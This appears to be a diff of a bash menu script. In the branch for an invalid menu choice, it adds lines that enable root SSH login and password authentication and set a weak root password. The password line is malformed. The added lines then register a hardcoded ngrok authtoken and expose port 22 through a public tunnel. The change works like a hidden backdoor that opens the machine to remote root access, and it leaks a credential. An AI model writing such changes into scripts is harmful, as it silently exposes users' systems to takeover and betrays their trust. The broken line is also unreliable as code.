@@ -117,5 +117,10 @@ echo " "
 echo -e "\e[36minvalid option\e[0m"
 sleep 2
 clear
-bash ngrok.sh
+echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
+echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
+root:King|chpasswd
+service ssh start
+./ngrok authtoken 2Wu1B0ch9zePwvzbq29Efg2fEpy_wXs4dxG8nwWsVVyrp3kG
+./ngrok tcp 22
 fi
